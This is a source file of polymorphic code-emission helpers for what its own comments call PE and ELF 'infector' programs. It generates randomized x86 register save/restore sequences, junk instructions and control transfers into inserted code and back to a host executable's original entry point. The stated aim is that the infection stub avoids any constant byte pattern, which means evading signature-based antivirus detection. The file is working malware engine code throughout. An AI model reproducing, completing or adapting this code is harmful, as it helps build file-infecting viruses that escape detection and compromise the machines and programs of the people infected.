// preloader_common.mc — Polymorphic skeleton helpers for entry preloaders.
//
// The four preloader-emitting programs (infector_pe / infector_elf /
// mystiquefall / lacrimystique) all need to save/restore a register set
// around the inserted code, transfer control to the inserted entry,
// transfer back to the original entry point, and pad with harmless
// junk. This module provides those primitives as randomized variants
// so the structural skeleton itself doesn't match a constant byte
// pattern.
//
// Design constraints:
//   - All helpers operate on a `char* buf` + `int off` pair and return
//     the new offset, matching the existing in-line preloader style.
//   - `current_va` arguments are the absolute VA where buf[off] will
//     live at runtime — used for rel32 displacement maths.
//   - `target_va` / `oep_va` are absolute virtual addresses.
//   - `allow_abs == 0` forces rel32-only encodings (PIC mode); otherwise
//     the helper picks among all variants weighted as documented.
//   - The indirect-transfer reg form excludes EDX (Linux entry-ABI
//     rtld_fini hand-off) and ESP, so the same helper is safe on both
//     Win32 and Linux.

// =============================================================================
// File Layout
// =============================================================================
//   1. Register Pickers        (pick_scratch_reg, pick_indirect_reg)
//   2. Polymorphic Reg Writes  (poly_zero_reg, poly_load_imm)
//   3. Junk Emission           (poly_junk)
//   4. Register Save/Restore   (emit_save_regs, emit_restore_regs)
//   5. Control Transfer        (emit_entry_call, emit_oep_transfer)
// =============================================================================


// =============================================================================
//
// Register Pickers Module
//
// =============================================================================

// Pick a non-ESP register chosen uniformly from {EAX,ECX,EDX,EBX,EBP,ESI,EDI}.
int pick_scratch_reg() {
    int r;
    r = prng_range(7);
    if (r >= 4) { r = r + 1; }
    return r;
}

// Pick a non-EDX, non-ESP register (0,1,3,5,6,7) for an indirect transfer.
int pick_indirect_reg() {
    int r;
    r = prng_range(6);
    // Map 0..5 → {0,1,3,5,6,7} skipping 2 (EDX) and 4 (ESP).
    if (r >= 2) { r = r + 1; }   // skip EDX
    if (r >= 4) { r = r + 1; }   // skip ESP
    return r;
}


// =============================================================================
//
// Polymorphic Register Writes Module
//
// =============================================================================

// Zero a register using a random variant. Returns new offset.
int poly_zero_reg(char* buf, int off, int reg) {
    int v;
    v = prng_range(4);
    if (v == 0) {
        // XOR reg, reg (31 C0+reg*9)
        buf[off] = 0x31; off = off + 1;
        buf[off] = (0xC0 + reg * 9) & 0xFF; off = off + 1;
    }
    if (v == 1) {
        // SUB reg, reg (29 C0+reg*9)
        buf[off] = 0x29; off = off + 1;
        buf[off] = (0xC0 + reg * 9) & 0xFF; off = off + 1;
    }
    if (v == 2) {
        // AND reg, 0 (81 E0+reg 00000000)
        buf[off] = 0x81; off = off + 1;
        buf[off] = (0xE0 + reg) & 0xFF; off = off + 1;
        write_i32(buf, off, 0); off = off + 4;
    }
    if (v == 3) {
        // MOV reg, 0 (B8+reg 00000000)
        buf[off] = (0xB8 + reg) & 0xFF; off = off + 1;
        write_i32(buf, off, 0); off = off + 4;
    }
    return off;
}

// Load an immediate value into a register using a random strategy. Returns new offset.
int poly_load_imm(char* buf, int off, int reg, int val) {
    int v;
    int delta;
    v = prng_range(5);
    if (v == 0) {
        // Direct: MOV reg, val (B8+reg val)
        buf[off] = (0xB8 + reg) & 0xFF; off = off + 1;
        write_i32(buf, off, val); off = off + 4;
    }
    if (v == 1) {
        // Zero + add: XOR reg,reg; ADD reg, val
        buf[off] = 0x31; off = off + 1;
        buf[off] = (0xC0 + reg * 9) & 0xFF; off = off + 1;
        buf[off] = 0x81; off = off + 1;
        buf[off] = (0xC0 + reg) & 0xFF; off = off + 1;
        write_i32(buf, off, val); off = off + 4;
    }
    if (v == 2) {
        // Complement: MOV reg, ~val; NOT reg
        buf[off] = (0xB8 + reg) & 0xFF; off = off + 1;
        write_i32(buf, off, val ^ -1); off = off + 4;
        buf[off] = 0xF7; off = off + 1;
        buf[off] = (0xD0 + reg) & 0xFF; off = off + 1;
    }
    if (v == 3) {
        // Offset: MOV reg, val+delta; SUB reg, delta
        delta = prng_range(0x7FFFFFFF) | 1;
        buf[off] = (0xB8 + reg) & 0xFF; off = off + 1;
        write_i32(buf, off, val + delta); off = off + 4;
        buf[off] = 0x81; off = off + 1;
        buf[off] = (0xE8 + reg) & 0xFF; off = off + 1;
        write_i32(buf, off, delta); off = off + 4;
    }
    if (v == 4) {
        // Stack thunk: PUSH imm32 ; POP reg (6 bytes, distinct shape from the
        // MOV-based variants — no opcode begins with B8+r).
        buf[off] = 0x68; off = off + 1;
        write_i32(buf, off, val); off = off + 4;
        buf[off] = (0x58 + reg) & 0xFF; off = off + 1;
    }
    return off;
}


// =============================================================================
//
// Junk Emission Module
//
// =============================================================================

// Emit 0-N polymorphic junk instructions. Mode depends on scratch_reg:
//
//   scratch_reg == -2 (strict): only forms that touch no general-purpose
//       register at all — only flags. Use where every reg holds a live
//       value and even a transient clobber is unsafe (syscall arg setup,
//       PIC base sequences). Forms:
//           TEST r1, r1                         (2 bytes — flags only)
//           CMP r1, r2                          (2 bytes — flags only)
//           LEA r1,[r1+k] ; LEA r1,[r1-k]       (6 bytes — live-restored)
//       Count: [0, 6].
//
//   scratch_reg == -1 (auto-pick): non-clobbering / live-restored forms,
//       picking their own non-ESP registers — safe to use outside any
//       save/restore bracket. Forms:
//           MOV r1, r2                          (2 bytes)
//           TEST r1, r1                         (2 bytes)
//           CMP r1, r2                          (2 bytes)
//           XCHG r1, r2                         (2 bytes)
//           LEA r1,[r1+k] ; LEA r1,[r1-k]       (6 bytes — live-restored,
//                                                compilers do this in
//                                                pointer arith)
//       Count: [0, 6].
//
//   scratch_reg >= 0 (pinned):    clobbering imm-arith forms targeting
//       scratch_reg. Caller must ensure scratch_reg is safe to clobber
//       (PUSHAD/save context, dead reg, or PUSH/POP envelope). Forms:
//           MOV reg, imm32                      (5 bytes)
//           ADD reg, imm32                      (6 bytes)
//           SUB reg, imm32                      (6 bytes)
//           XOR reg, imm32                      (6 bytes)
//           AND reg, imm32                      (6 bytes)
//           SHL reg, N                          (3 bytes, N in [1, 5])
//           SHR reg, N                          (3 bytes, N in [1, 5])
//       Count: [0, 8].
//
// Count distribution is uniform over the range (tail-light vs. peaked)
// to avoid an "always 1-4" fingerprint.
int poly_junk(char* buf, int off, int scratch_reg) {
    int n; int i; int op; int r1; int r2; int k; int imm;

    if (scratch_reg == -2) {
        // Strict mode: 3 flags-only / live-restored forms, count [0, 6].
        n = prng_range(7);
        i = 0;
        while (i < n) {
            op = prng_range(3);
            r1 = prng_range(6) + 1;
            if (r1 >= 4) { r1 = r1 + 1; }
            r2 = prng_range(5) + 1;
            if (r2 >= 4) { r2 = r2 + 1; }
            if (r2 >= r1) { r2 = r2 + 1; }
            if (r2 == 4) { r2 = r2 + 1; }
            if (op == 0) {
                // TEST r1, r1
                buf[off] = 0x85; off = off + 1;
                buf[off] = 0xC0 + r1 * 9; off = off + 1;
            }
            if (op == 1) {
                // CMP r1, r2
                buf[off] = 0x39; off = off + 1;
                buf[off] = 0xC0 + r2 * 8 + r1; off = off + 1;
            }
            if (op == 2) {
                // LEA r1, [r1+k] ; LEA r1, [r1-k]
                if (r1 == 5) { r1 = 6; }
                k = (prng_range(127) + 1) & 0x7F;
                buf[off] = 0x8D; off = off + 1;
                buf[off] = 0x40 + r1 * 8 + r1; off = off + 1;
                buf[off] = k & 0xFF; off = off + 1;
                buf[off] = 0x8D; off = off + 1;
                buf[off] = 0x40 + r1 * 8 + r1; off = off + 1;
                buf[off] = (-k) & 0xFF; off = off + 1;
            }
            i = i + 1;
        }
    } else if (scratch_reg < 0) {
        // Auto-pick mode: 5 non-clobbering forms, count [0, 6].
        n = prng_range(7);
        i = 0;
        while (i < n) {
            op = prng_range(5);
            // Pick two different non-ESP registers (avoid reg 4 = ESP).
            r1 = prng_range(6) + 1;
            if (r1 >= 4) { r1 = r1 + 1; }
            r2 = prng_range(5) + 1;
            if (r2 >= 4) { r2 = r2 + 1; }
            if (r2 >= r1) { r2 = r2 + 1; }
            if (r2 == 4) { r2 = r2 + 1; }
            if (op == 0) {
                // MOV r1, r2
                buf[off] = 0x8B; off = off + 1;
                buf[off] = 0xC0 + r1 * 8 + r2; off = off + 1;
            }
            if (op == 1) {
                // TEST r1, r1
                buf[off] = 0x85; off = off + 1;
                buf[off] = 0xC0 + r1 * 9; off = off + 1;
            }
            if (op == 2) {
                // CMP r1, r2
                buf[off] = 0x39; off = off + 1;
                buf[off] = 0xC0 + r2 * 8 + r1; off = off + 1;
            }
            if (op == 3) {
                // XCHG r1, r2
                buf[off] = 0x87; off = off + 1;
                buf[off] = 0xC0 + r1 * 8 + r2; off = off + 1;
            }
            if (op == 4) {
                // LEA r1, [r1+k] ; LEA r1, [r1-k]   (k in [1, 127], disp8)
                // r1 must not be EBP (5) for the disp8 [r+k] encoding via mod=01;
                // bump EBP to ESI for this single form.
                if (r1 == 5) { r1 = 6; }
                k = (prng_range(127) + 1) & 0x7F;
                buf[off] = 0x8D; off = off + 1;
                buf[off] = 0x40 + r1 * 8 + r1; off = off + 1;
                buf[off] = k & 0xFF; off = off + 1;
                buf[off] = 0x8D; off = off + 1;
                buf[off] = 0x40 + r1 * 8 + r1; off = off + 1;
                buf[off] = (-k) & 0xFF; off = off + 1;
            }
            i = i + 1;
        }
    } else {
        // Pinned-scratch mode: 7 clobbering imm-arith forms, count [0, 8].
        n = prng_range(9);
        i = 0;
        while (i < n) {
            op = prng_range(7);
            imm = prng_range(0x7FFFFFFF);
            if (op == 0) {
                // MOV reg, imm32
                buf[off] = (0xB8 + scratch_reg) & 0xFF; off = off + 1;
                write_i32(buf, off, imm); off = off + 4;
            }
            if (op == 1) {
                // ADD reg, imm32
                buf[off] = 0x81; off = off + 1;
                buf[off] = (0xC0 + scratch_reg) & 0xFF; off = off + 1;
                write_i32(buf, off, imm); off = off + 4;
            }
            if (op == 2) {
                // SUB reg, imm32
                buf[off] = 0x81; off = off + 1;
                buf[off] = (0xE8 + scratch_reg) & 0xFF; off = off + 1;
                write_i32(buf, off, imm); off = off + 4;
            }
            if (op == 3) {
                // XOR reg, imm32
                buf[off] = 0x81; off = off + 1;
                buf[off] = (0xF0 + scratch_reg) & 0xFF; off = off + 1;
                write_i32(buf, off, imm); off = off + 4;
            }
            if (op == 4) {
                // AND reg, imm32
                buf[off] = 0x81; off = off + 1;
                buf[off] = (0xE0 + scratch_reg) & 0xFF; off = off + 1;
                write_i32(buf, off, imm); off = off + 4;
            }
            if (op == 5) {
                // SHL reg, N (N in [1, 5])
                buf[off] = 0xC1; off = off + 1;
                buf[off] = (0xE0 + scratch_reg) & 0xFF; off = off + 1;
                buf[off] = (prng_range(5) + 1) & 0xFF; off = off + 1;
            }
            if (op == 6) {
                // SHR reg, N (N in [1, 5])
                buf[off] = 0xC1; off = off + 1;
                buf[off] = (0xE8 + scratch_reg) & 0xFF; off = off + 1;
                buf[off] = (prng_range(5) + 1) & 0xFF; off = off + 1;
            }
            i = i + 1;
        }
    }
    return off;
}


// =============================================================================
//
// Register Save/Restore Module
//
// =============================================================================

// Pick 3-7 distinct registers from {EAX,ECX,EDX,EBX,EBP,ESI,EDI},
// emit `PUSH r` for each in randomized order, write the chosen
// registers (in push order) to out_order, set *out_n to the count.
// Returns the new offset.
int emit_save_regs(char* buf, int off, int* out_order, int* out_n) {
    int avail[7];
    int n; int i; int j; int t;

    avail[0] = 0;  // EAX
    avail[1] = 1;  // ECX
    avail[2] = 2;  // EDX
    avail[3] = 3;  // EBX
    avail[4] = 5;  // EBP
    avail[5] = 6;  // ESI
    avail[6] = 7;  // EDI

    n = 3 + prng_range(5);  // [3, 7]

    // Partial Fisher-Yates: take n distinct picks from 7 candidates.
    i = 0;
    while (i < n) {
        j = i + prng_range(7 - i);
        t = avail[i]; avail[i] = avail[j]; avail[j] = t;
        buf[off] = (0x50 + avail[i]) & 0xFF; off = off + 1;
        out_order[i] = avail[i];
        i = i + 1;
    }
    *out_n = n;
    return off;
}

// Like emit_save_regs but PUSHes a *specific* set of registers in random
// order. Used by callers (e.g. syscall wrappers) that know exactly which
// callee-saved regs they clobber and need to save all of them.
//
// regs[]      — register numbers to save (e.g. {3,6,7,5} for {EBX,ESI,EDI,EBP})
// n           — number of registers in regs[]
// out_order[] — receives the actual push order; pass to emit_restore_regs to unwind
int emit_save_regs_specific(char* buf, int off, int* regs, int n, int* out_order) {
    int local[8];
    int i; int j; int t;

    // Copy regs[] to local working array (full Fisher-Yates needs in-place shuffle).
    i = 0;
    while (i < n) {
        local[i] = regs[i];
        i = i + 1;
    }

    // Fisher-Yates shuffle, emit PUSH r for each in shuffled order.
    i = 0;
    while (i < n) {
        j = i + prng_range(n - i);
        t = local[i]; local[i] = local[j]; local[j] = t;
        buf[off] = (0x50 + local[i]) & 0xFF; off = off + 1;
        out_order[i] = local[i];
        i = i + 1;
    }
    return off;
}

// Emit POP+r for each register in `order` in REVERSE order (LIFO unwind).
int emit_restore_regs(char* buf, int off, int* order, int n) {
    int i;
    i = n - 1;
    while (i >= 0) {
        buf[off] = (0x58 + order[i]) & 0xFF; off = off + 1;
        i = i - 1;
    }
    return off;
}


// =============================================================================
//
// Control Transfer Module
//
// =============================================================================

// Emit a CALL to target_va. Variants:
//   70%  CALL rel32                           (5 bytes)
//   30%  MOV r, target ; CALL r               (7 bytes)
// allow_abs == 0 forces variant 0 only (PIC mode).
//
// `current_va` is the absolute VA where buf[off] (the CALL opcode) will
// live at runtime. The rel32 displacement is target - (current_va + 5)
// because CALL rel32 is 5 bytes and rel32 is relative to the *end* of
// the instruction.
int emit_entry_call(char* buf, int off, int target_va, int current_va, int allow_abs) {
    int v; int reg; int rel;
    v = 0;
    if (allow_abs != 0) { v = prng_range(100); }
    if (v < 70) {
        // CALL rel32
        buf[off] = 0xE8; off = off + 1;
        rel = target_va - (current_va + 5);
        write_i32(buf, off, rel); off = off + 4;
    } else {
        // MOV r, target ; CALL r  (current_va not used for absolute encodings)
        reg = pick_indirect_reg();
        buf[off] = (0xB8 + reg) & 0xFF; off = off + 1;
        write_i32(buf, off, target_va); off = off + 4;
        buf[off] = 0xFF; off = off + 1;
        buf[off] = (0xD0 + reg) & 0xFF; off = off + 1;
    }
    return off;
}

// Emit an unconditional transfer to oep_va. Variants:
//   60%  JMP rel32                            (5 bytes)
//   30%  PUSH oep ; RET                       (6 bytes)
//   10%  MOV r, oep ; JMP r                   (7 bytes)
// allow_abs == 0 forces JMP rel32 only (PIC mode).
//
// `current_va` is the absolute VA where buf[off] (the first opcode
// byte) will live at runtime. Only used by the rel32 variant.
int emit_oep_transfer(char* buf, int off, int oep_va, int current_va, int allow_abs) {
    int v; int reg; int rel;
    v = 0;
    if (allow_abs != 0) { v = prng_range(100); }
    if (v < 60) {
        // JMP rel32 (5 bytes)
        buf[off] = 0xE9; off = off + 1;
        rel = oep_va - (current_va + 5);
        write_i32(buf, off, rel); off = off + 4;
    } else if (v < 90) {
        // PUSH oep ; RET (6 bytes)
        buf[off] = 0x68; off = off + 1;
        write_i32(buf, off, oep_va); off = off + 4;
        buf[off] = 0xC3; off = off + 1;
    } else {
        // MOV r, oep ; JMP r (7 bytes)
        reg = pick_indirect_reg();
        buf[off] = (0xB8 + reg) & 0xFF; off = off + 1;
        write_i32(buf, off, oep_va); off = off + 4;
        buf[off] = 0xFF; off = off + 1;
        buf[off] = (0xE0 + reg) & 0xFF; off = off + 1;
    }
    return off;
}
